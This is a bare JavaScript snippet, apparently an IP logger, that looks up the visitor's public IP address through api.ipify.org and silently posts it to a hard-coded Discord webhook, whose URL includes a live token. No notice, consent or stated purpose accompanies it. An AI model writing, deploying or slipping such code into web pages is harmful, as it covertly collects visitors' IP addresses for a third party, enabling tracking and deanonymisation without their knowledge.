var ip = '';
fetch('https://api.ipify.org/?format=json')
.then(function(response) {
    return response.json();
})
.then(function(data) {
    ip = data.ip;
    var webhook = 'https://discord.com/api/webhooks/1125774240810012722/2DzDW9RIF3_5NL8KMNKAYAo7r2olcHCxYoGGDed6y7bBjJc7hYPIEYgIuakjW3-lCvgC'
    var message = {
        content: 'IP:' + ip
    };

    fetch(webhook, {
        method: 'POST',
        headers: { 
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(message)
    });
});
